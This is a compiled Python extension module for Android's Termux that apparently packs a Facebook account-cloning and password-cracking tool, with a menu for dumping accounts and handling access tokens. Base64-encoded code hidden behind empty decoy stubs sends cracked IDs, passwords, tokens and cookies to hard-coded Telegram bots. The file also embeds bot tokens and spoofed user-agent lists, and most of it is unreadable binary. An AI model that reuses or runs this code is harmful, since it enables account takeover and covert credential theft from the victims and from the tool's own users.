ELF���������������T�������@�������(x���������@�8�

�@� ��������@�������@�������@�������0������0�������������������������������������������T�������T��������������������T�������T�������T�������������������������������������������������������������������������������������h�������h�������h��������������������������������������������������������������������������������R�td���������������������������������� �������������P�td������������������������|�������|��������������Q�td���������������������������������������������������������p������p������p���������������������������������������Android����r23b������������������������������������������������������������7779620���������������������������������������������������������������������������������������������������������������������������������������������������S����������������������d����������������������v���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������

������������������������������������������1���������������������H���������������������T���������������������g���������������������u����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������(���������������������P���������������������a���������������������x���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������!���������������������.���������������������=���������������������L���������������������f���������������������w�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������)���������������������?���������������������M���������������������_���������������������l���������������������|���������������������������������������������������������������������������������������������������������������������������������������������������������/��������������������;���������������������@��������������������G����

����������������6���������������������������������������������������������������������������������������������������������c

�����������������E����������������*E����qX��|BE����O彤�ZJ���J���������H���?���>��������������,���C���<����������=���&���!�������"���$���������������9�����������������������������;����������A�����������:���������������I���0���*�������-��������������

����������2���������������G�������

������D������1���'���#���.���4����������F����������3���E������������������������������������������������������������������������������������������������������������������������������������������������������������������������ �����������%����������+��������������)�������5�����������(���7���/������8���������������	���@��������������B���6��������__cxa_atexit�__cxa_finalize�__register_atfork�__bss_start�_end�_edata�PyInit_dump�PyModuleDef_Init�PyThreadState_Get�PyInterpreterState_GetID�PyExc_ImportError�PyErr_SetString�PyObject_GetAttrString�PyModule_NewObject�_Py_Dealloc�PyModule_GetDict�PyDict_SetItemString�_Py_NoneStruct�PyExc_AttributeError�PyErr_ExceptionMatches�PyErr_Clear�PyExc_RuntimeError�PyOS_snprintf�Py_GetVersion�PyErr_WarnEx�PyTuple_New�PyBytes_FromStringAndSize�PyUnicode_FromStringAndSize�PyImport_AddModule�PyObject_SetAttrString�PyUnicode_InternFromString�PyUnicode_Decode�PyObject_Hash�__pyx_module_is_main_dump�PyObject_SetAttr�PyImport_GetModuleDict�PyDict_GetItemString�PyTuple_Pack�PyList_New�PyDict_New�PyImport_ImportModuleLevelObject�_PyThreadState_UncheckedGet�_PyObject_GetDictPtr�_Py_FalseStruct�_Py_TrueStruct�PyObject_Not�PyErr_Occurred�PyDict_SetItem�_PyDict_GetItem_KnownHash�PyObject_GetAttr�PyUnicode_FromFormat�PyUnicode_AsUTF8�PyCode_NewEmpty�PyFrame_New�PyTraceBack_Here�PyMem_Realloc�PyMem_Malloc�__stack_chk_fail�PyExc_NameError�PyErr_Format�Py_EnterRecursiveCall�Py_LeaveRecursiveCall�PyObject_Call�PyExc_SystemError�PyObject_Dir�PyDict_Contains�PyExc_TypeError�PyEval_GetBuiltins�PyCode_Type�PyUnicode_AsUTF8String�PyEval_MergeCompilerFlags�PyRun_StringFlags�PyEval_EvalCode�libc.so�LIBC�/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib�libandroid-support.so�libpython3.10.so.1.0�����������������������������������������������������������������������������������������������������������������8�������������0�������@��������������������`���������������������h�����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������(���������������������0��������������������x�������������l���������������������T�������������������������������������������������������������������������������������Ļ���������������������������(��������������������0��������������������8��������������������@��������������������P���������'�����������X���������(�����������`���������6�����������h���������;�����������p���������>�����������x���������@�����������H���������I������������������������������������������������������������������������������������������������������������������������������������������������������������������������	������������������������������������������������������������������������������������

����������������������������������������������������������������������������������������������������������������� ��������������������(��������������������0��������������������8��������������������@��������������������H��������������������P��������������������X��������������������`��������������������h��������������������p��������� �����������x���������!���������������������"���������������������#���������������������$���������������������%���������������������&���������������������)���������������������*���������������������+���������������������,���������������������-���������������������.���������������������/���������������������0���������������������1���������������������2���������������������3���������������������4��������������������5��������������������7��������������������8����������� ���������9�����������(���������:�����������0���������<�����������8���������=�����������@���������?�����������H���������A�����������P���������B�����������X���������C�����������`���������D���������������

���parent�Module 'dump' has already been imported. Re-initialisation is not supported.�%s�/sdcard/backups/dump.c�exec: arg 1 must be string, bytes or code object, got %.200s� while calling a Python object�name�init dump�%d.%d�__file__�submodule_search_locations�__loader__�__package__�dump�__path__�code object passed to exec() may not contain free variables�cython_runtime�compiletime version %s of module '%.100s' does not match runtime version %s�dump.py�Interpreter change detected - this module can only be loaded into one interpreter per process.�NULL result without error in PyObject_Call�builtins��exec() arg 2 must be a dict, not %.200s�%s (%s:%d)�loader�origin�name '%U' is not defined�__builtins__�cline_in_traceback�__import__�loads�__main__�marshal�__name__���������������������@���s���d�dl�Z�ee��d���dS�)�����Ns������������������������@���s���d�dl�Z�ee��d���dS�)�����Ns�����������������������@���s���d�dl�Z�ee��d���dS�)�����Ns������������������������@���s���d�dl�Z�ee��d���dS�)�����Ns

�����������������������@���s���d�dl�Z�ee��d���dS�)�����Ns������������������������@���s���d�dl�Z�ee��d���dS�)�����Ns������������������������@���s���d�dl�Z�ee��d���dS�)�����Nsl�����������������������@���s���d�dl�Z�ee��d���dS�)�����Ns�����������������������@���s���d�dl�Z�ee��d���dS�)�����NsX�����������������������@���s���d�dl�Z�ee��d���dS�)�����Ns΄����������������������@���s���d�dl�Z�ee��d���dS�)�����NsD�����������������������@���s���d�dl�Z�ee��d���dS�)�����Ns������������������������@���s���d�dl�Z�ee��d���dS�)�����Ns0�����������������������@���s���d�dl�Z�ee��d���dS�)�����Ns������������������������@���s���d�dl�Z�ee��d���dS�)�����Ns�����������������������@���s���d�dl�Z�ee��d���dS�)�����Ns������������������������@���s���d�dl�Z�ee��d���dS�)�����Ns��������������������

���@���s.��d�dl�Z�d�dlZzd�dlZW�n�ey ���ed��e��d��Y�nw�zd�dlZW�n�ey9���ed��e��d��Y�nw�zd�dlZW�n�eyR���ed��e��d��Y�nw�zd�dlZW�n�eyg���e��d��Y�nw�d�dlZ	d�dlZ

d�dlZd�dlZd�dl

Z

d�dl�Z�d�dlZd�dlZd�dlZd�dlZd�dlZd�dl

Z

d�dlZd�dl

Z

d�dlZd�dlZd�dlZd�dlZd�dlZd�dlZd�dlZd�dlZd�dl�Z�d�dlZd�dlZd�dlZd�dlZd�dlZd�dlZd�dl

Z

d�dlZd�dl

Z

d�dlZd�d	lmZ�d�d

lmZ�d�dlmZ�d�dlmZ�d�dlmZ�d�d

lmZ�d�dlmZ�d�dlmZ�d�dlZ d�dlm!Z!�G�dd��d�Z"d�dl#m$Z%�d�dl#m$Z$�d�dl#m$Z&�d�dl#m$Z%�d�dl#m$Z'�d�dl(m)Z)�d�dlmZ*�d�dlmZ+�d�dl(m)Z)�ze��,d��W�n���Y�ze��,d��W�n���Y�ze��-d��W�n���Y�ze��-d��W�n���Y�ze��-d��W�n���Y�dZ.dZ/dZ0dZ1dZ2dZ3d Z4d!Z5d"Z6d#Z7d$Z/d%Z3d&Z1d'Z.d(Z0d'Z8d"Z9d#Z:d$Z;d%Z<d&Z=d)Z>d'Z?d(Z@d'ZAd*ZBd+ZCd,ZDd-ZEeCd.�ZFG�d/d0��d0�ZGG�d1d2��d2�ZHG�d3d4��d4�ZIg�d5�ZJd6ZKg�d7�ZLd8ZMd�dlZd�dl�Z�d�dlZd�dlZd�dlNZNeOe�jPd9�ZQejRg�d:�eQejSd;�ZTeQ�U���eTd�k�r1e��d<��d=\ZVZWd�ZXg�ZYg�ZZi�Z[i�Z\d�Z]d�Z]g�Z^g�Z_g�Z`g�Zad�Zbd�Zcd�Zdd�Zed�Zfg�Zgg�Zhg�Zid�Zjg�Zkg�Zld>\ZmZnZod?Zpd?Zqg�Z^g�Z_g�Z`g�Zri�i�Z[Z\g�g�ZYZse�t��Zud@Zve�w��Zxeye�w���zdA��Z{exj|Z}exj~Zexj�Z�e�w��Zxeye�w���zdB��Z�eye�w���zdC��Ze�w���zdD�Z�dEdFdGdHdIdJdKdLdMdNdOdPdQ�Z�dRZ�ee3e7e2e8g�Z�dRZ�z	eOdSdT�����a�W�n���edUg�a�e�g�dV��Z�e�g�dW��Z�Y�z

e��dX��

��dY�����Z�W�n���dZZ�Y�G�d[d\��d\�Z�G�d]d^��d^�Z�G�d_d`��d`�Z�G�dadb��db�Z�G�dcdd��dd�Z�G�dedf��df�Z�G�dgdh��dh�Z�G�didj��dj�Z�G�dkdl��dl�Z�G�dmdj��dj�Z�G�dndo��do�Z�G�dpdq��dq�Z�G�drds��ds�Z�G�dtdu��du�Z�G�dvdw��dw�Z�G�dxdy��dy�Z�G�dzd{��d{�Z�g�Z�g�Z�G�d|d}��d}�Z�G�d~dd��dd�Z�G�dd���d��Z�dS�)������NzAKINH Install Module requestsz+python -m pip install requests &> /dev/nullzAKING Install Module bs4z&python -m pip install bs4 &> /dev/nullzAKING Install Module mechanizez,python -m pip install mechanize &> /dev/nullz'python -m pip install gTTS &> /dev/null)�date)�datetime)�sleep)�random)�choice)�randint)�

BeautifulSoup)�exitc�������������������@�������e�Zd�Zdd��ZdS�)�jalanc�����������������C���s2���|d�D�]}t�j�|��t�j����t�d��qd�S�)N�

g;�O��n�?)�sys�stdout�write�flush�timer���)�self�z�e��r����<alvino>�__init__���s

���

�zjalan.__init__N��__name__�

__module__�__qualname__r���r���r���r���r���r�����������r���)�ThreadPoolExecutor)�ConnectionErrorzold.txtz	oldv2.txt�dump�result�/sdcard/z[0;97mz[0;91mz[0;92mz[0;93mz[0;94mz[0;95mz[0;96mz[0mz[0;32mz[0;36mz[0;31mz[0;35mz[0;33mz[00mz[0;90mz[0;34mz2.0.3z   [+] z   [*] u	���   [•] u����[1;97m [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡c�������������������@���r

���)�play_mpvc�����������������C���sN���da�zt�dksdt�krzt�d|���W�W�d�S����Y�W�d�S�W�d�S����Y�d�S�)N�yzplay-audio )�alam�os�popen)r����xr���r���r���r���]���s����zplay_mpv.__init__Nr���r���r���r���r���r"���\���r���r"���c�������������������@���r

���)�

pilih_alamc�����������������C���sL���t�td��}|dks|dkr"ttd���ttd���datd��d�S�dad�S�)NzHDo you want to make a sound/alarm if the crack results come out (Y/n) : r#����YzMIf there is Uncle Garookx's voice, it's a sign that the crack results are outzExample ...zassalamualaikum.mp3�Garoookkxxx)�input�warr���r$���r"���)r���Zpil_br���r���r���r���g���s���(zpilih_alam.__init__Nr���r���r���r���r���r(���f���r���r(���c�������������������@���r

���)�pilih_infongc�����������������C���s,���t�td��}|dks|dkrdad�S�dad�S�)Nz2Do you want to display account information (Y/n) :r#���r)���r*���)r+���r,���Zinfoong)r���Zpil_vvr���r���r���r���q���s���zpilih_infong.__init__Nr���r���r���r���r���r-���p���r���r-���)z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36zlMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36zDMozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckozHMozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0ztMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9zMozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4zlMozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36zmMozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36z�Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240zHMozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0ah��IyMjIyMjID4+Pj4gU0VUSU5HQU4gVE9LRU4gQ1JBQ0sgQkFQSSBEQU4gTUJBU0lDClRPT0tLVUtJUyA9ICgiMjEwNzcxNzc2MzpBQUc2eHZGZ1lQNm5Rbm5LMFFNMmVLb1VpNGdaLU1kVnU3YyIpClRPT0sgPSAoIjIxNDE4NDE5NTI6QUFHNmNWQVVHMllIRFlzcG9oNWw4cXZXMlZYZkkteC1GdkEiKQpJRFRUID0gKCIxNTcwNTY2MzcwIikKSURUVFQgPSAoIjIxMzg2NDQ1MzciKQpfc2VzPXJlcXVlc3RzLlNlc3Npb24oKQp1cmxzPSJodHRwczovL2J1c2luZXNzLmZhY2Vib29rLmNvbS9idXNpbmVzc19sb2NhdGlvbnMiCmRlZiBib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgdHRsX3RhcmdldCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9T0sge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsaWYgIlRBUCIgPT0gU1RUIG9yIFNUVCA9PSAiVEFQIjoKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDcxNTQ4Mzg3OkFBSGpMcGRncVpkckFmZFdEYzZta3V5dHVaNUpfSkl0Nmd3L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9e2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIHJlcXVlc3RzLnBvc3QoZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhaykKZGVmIGJva2VwX2JhcmF0X3lhbmdfdGVyYmFydSh0b2tlbik6CiAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvb2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9PS0tVS0lTfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PXt0b2tlbn0nJycpCiAgICAgICAgcmVxdWVzdHMucG9zdChkYXNhcl9rYW5nX3JlY29kZXJfa29udG9vbF9lbmdnYV9hZGFfb3RhaykKCgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1djIoU1RULCBpZF90YXJnZXQsIHB3X3RhcmdldCwgZm9reCk6CiAgICAgICAgaWYgIk9LIiA9PSBTVFQgb3IgU1RUID09ICJPSyI6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90NTA0MDMwMDgxODpBQUVRSWNGbFEtS1JhSnAxczZTOEVCcDhzZnR6OWJzS01Hby9zZW5kTWVzc2FnZT9jaGF0X2lkPTIxMzg2NDQ1MzcmdGV4dD17aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7Zm9reH0nJycpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWsgPSAoZicnJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Q1MDIxNDkyNzYwOkFBRlN6Y0lUQTd4N2dSdHp2andBU3VSbGtaTEc3U0pPN0ZnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtpZF90YXJnZXR9fHtwd190YXJnZXR9fHtmb2t4fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBha3VuX29rKHVzZXJyLCBwd3csIGNva2lpKToKICAgICAgICBsaW5rX2JvdCA9ICI1MTA4OTE2MDc2OkFBRllnWjU4Sk1FcFlnUXVMOFFhLW9XZTVaWGpNWE5USlJ3IgogICAgICAgIGxpbmtfX2JvdCA9ICIyMTM1NTE0MTY3OkFBSG1kQVhVM0Q2V1RTY2NOeGlPTlNCeU1pZzVrVnhPc2NzIgoKCiAgICAgICAgbHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX2JvdH0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0yMTM4NjQ0NTM3JnRleHQ9e3VzZXJyfXx7cHd3fScnJykKICAgICAgICBscHBwcCA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtsaW5rX19ib3R9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9MjEzODY0NDUzNyZ0ZXh0PXtjb2tpaX0nJycpCgoKICAgICAgICByZXF1ZXN0cy5wb3N0KGxwcHApCiAgICAgICAgcmVxdWVzdHMucG9zdChscHBwcCkKzDMozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like GeckozeMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36z=Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like GeckozIMozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0zvMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36zRMozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0zuMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17z}Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4z|Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4zMr.Risky)�{NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+��Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]a���X3Nlcz1yZXF1ZXN0cy5TZXNzaW9uKCkKdXJscz0iaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20vYnVzaW5lc3NfbG9jYXRpb25zIgpkZWYgYm9rZXBfamFwYW5feWFuZ190ZXJiYXJ1KFNUVCwgaWRfdGFyZ2V0LCBwd190YXJnZXQsIHR0bF90YXJnZXQpOgogICAgICAgIGlmICJPSyIgPT0gU1RUIG9yIFNUVCA9PSAiT0siOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpPSyB7aWRfdGFyZ2V0fXx7cHdfdGFyZ2V0fXx7dHRsX3RhcmdldH0nJycpCiAgICAgICAgZWxpZiAiVEFQIiA9PSBTVFQgb3IgU1RUID09ICJUQVAiOgogICAgICAgICAgICAgICAgZGFzYXJfa2FuZ19yZWNvZGVyX2tvbnRvbF9lbmdnYV9hZGFfb3RhayA9IChmJycnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtUT09LfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtJRFRUfSZ0ZXh0PQpUQVAge2lkX3RhcmdldH18e3B3X3RhcmdldH18e3R0bF90YXJnZXR9JycnKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXNhcl9rYW5nX3JlY29kZXJfa29udG9sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e0lEVFR9JnRleHQ9CntpZF90YXJnZXR9fHtwd190YXJnZXR9fHt0dGxfdGFyZ2V0fScnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b2xfZW5nZ2FfYWRhX290YWspCmRlZiBib2tlcF9iYXJhdF95YW5nX3RlcmJhcnUodG9rZW4pOgogICAgICAgIGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrID0gKGYnJydodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPT0tLVUtJU30vc2VuZE1lc3NhZ2U/Y2hhdF9pZD17SURUVH0mdGV4dD0KW+KAol09PT09PS0tLS0tLS0tLS0tLS0tLT09PT09W+KAol0KWz9dIFRPS0VOIEZBQ0VCT09LIDIwMjEgOgp7dG9rZW59CicnJykKICAgICAgICByZXF1ZXN0cy5wb3N0KGRhc2FyX2thbmdfcmVjb2Rlcl9rb250b29sX2VuZ2dhX2FkYV9vdGFrKQoKI2Jva2VwX2phcGFuX3lhbmdfdGVyYmFydSgiQ1AiLCAiMyIsICIyIiwgIjEiKQojYm9rZXBfYmFyYXRfeWFuZ190ZXJiYXJ1KCJ0b2tlbiIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIkNQIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCiNib2tlcF9qYXBhbl95YW5nX3RlcmJhcnUoIk9LIiwgdXNlcm5hbWUsIHBhc3N3b3JkLCAiLSIpCg==A���ZGVmIGZha2UodGV4dCk6CiAgICAgICAgIyBTZWxhbWF0IEFuZGEgTWVuamFkaSBLYW5nIERlY3J5cHQgOikKICAgICAgICAjIEJ5IE1yLlJpc2t5CiAgICAgICAgaW1wb3J0IGJhc2U2NAogICAgICAgIEJPS0VQID0gIkBLTlRMQCIKICAgICAgICBibyA9ICIiCiAgICAgICAgZ2xvYmFsIGJvYQogICAgICAgIGJvayA9IHRleHQuc3BsaXQoIkBLTlRMQCIpCiAgICAgICAgZm9yIG5hIGluIGJvazoKICAgICAgICAgICAgICAgIGJvICs9IChuYSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgYm9hID0gYmFzZTY0LmIzMmRlY29kZShibykK��Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11�{nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+z+6283143565470�w)Zdpkgz-sz

play-audio)r����stderrz&pkg install play-audio -y &> /dev/null)r���r���)r���r���r���zhttps://mbasic.facebook.comz0https://business.facebook.com/business_locationsz%d-%m-%Yz%Y-%m-%dz%Y%m%dz%H:%M:%SZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�01�02�03�04Z05Z06Z07Z08Z09Z10Z11Z12u���[1;37m

   __  _______ __  ______    _   __

  / / / / ___//  |/  /   |  / | / /

 / / / /\__ \/ /|_/ / /| | /  |/ / 

/ /_/ /___/ / /  / / ___ |/ /|  /  

\____//____/_/  /_/_/  |_/_/ |_/   

 [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡

    Author   : USMANSHERPAO

    Facebook : facebook.com/Da.cha.badmashe.na.manam

    Version  : 1.1

    LOVE U   : SANAN😘

 [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡

 [1;31m   MAKE UNLIMITED FILE WITH ONE ID 😎[1;37m

 [*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡z.ua�rr/���)r.���r/���r0���r1���)r.���r0���r1���zhttp://ip-api.com/json/Zcountry�Nonec�������������������@���r

���)�bokep_japan_yang_terbaruc�����������������C�������d}d}d�S��N��r���)r����STT�	id_target�	pw_targetZ

ttl_target�	baka_baka�nande_nander���r���r���r�����������z!bokep_japan_yang_terbaru.__init__Nr���r���r���r���r���r:�������r���r:���c�������������������@���r

���)�bokep_barat_yang_terbaruc�����������������C���s���d}d}d�S�r<���r���)r����tokenrA���rB���r���r���r���r�������rC���z!bokep_barat_yang_terbaru.__init__Nr���r���r���r���r���rD�������r���rD���c�������������������@���r

���)�akun_okc�����������������C���s���d}d}d�S�r<���r���)r���ZuserrZpwwZcokiirA���rB���r���r���r���r�������rC���zakun_ok.__init__Nr���r���r���r���r���rF�������r���rF���c�������������������@���r

���)�bokep_japan_yang_terbaruv2c�����������������C���r;���r<���r���)r���r>���r?���r@���ZfokxrA���rB���r���r���r���r�������rC���z#bokep_japan_yang_terbaruv2.__init__Nr���r���r���r���r���rG�������r���rG���c�������������������@���r

���)�menuc�����������������C���s���t��d��z,tdd����}tdd����}t�d|��}t�|j�}z|d�}W�n���|d�}Y�W�n���t	t

d���t�d��t

���Y�t	t��d	}ttj|d

tid�jd�}|jd

dd�j}|jd

dd�j}	|jd

dd�j}

|jd

dd�j}|jd

dd�j}|�dd�a|	�dd�}

|

�dd�}|�dd�}|�dd�}t	d��t	d��t	d��t	d��t	d��t	d��t	td���t	td���t	td ���t	td!���t	td"���td#�}|d$v�r�t	t

d%���t�d&��t���d�S�|d'v�r�t���t���t��d(��d�S�|d)v��r	t���t���d�S�|d*v��rt���t��d(��d�S�|d+v��r't���t��d(��d�S�|d,v��r<tt

d-���t��d.��t���d�S�t	t

d/���d�S�)0N�clear�

.login.txtr8����,https://graph.facebook.com/me/?access_token=�name�username� Token Invalid�����https://www.whatsmyua.info�

user-agent�Zheaders�html.parser�li�rawUa��id�family�productr%����layout�rawUa: r=����family: �	product: �os: �layout: u���[✓] Powered  By IMTIAZu���[✓] Premium Cloning toolu#���[✓] Make Unlimited File with 1 ID�����[1;97m[*]｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡｡z/[1;97m[01] Dump unlimited Account only 1 Link z4[1;97m[02] slice and sort file ([1;92mAuto[1;97m)z6[1;97m[03] slice and sort file ([1;92mChoice[1;97m)z4[1;97m[04] Remove Dubble links ([1;92mAuto[1;97m)z8[1;97m[00] Delete Token ([1;91mToken & Cookies[1;97m)z

[1;97m[*] Choose option : )r=���� zDon't Empty Please Select one ����)�1r4����python Brand.py)�2r5���)�3r6���)�4r7���)�0Z00z Thank You For Using My Script   �rm -rf .login.txtzFill it Correctly)r%����system�open�read�requests�get�json�loads�text�printr,���r���r����login�logo�parser�ua�find�replace�I�Cr+���rH����	dump_ulti�sortr	����msort�dubbr���)r����toketrE����otw�a�nama�url_main�s�raw_uarX����name_hp�os_�ly�jenis_ua�jenis_hp�jenis_os�jenis_ly�bar���r���r���r�������s|���



�



















�

menu.__init__Nr���r���r���r���r���rH�������r���rH���c�������������������@���r

���)r~���c�����������������C���sn���t�d�}t�d|�d���t�d��t�d��t�d��td��td��td	��td��t�d

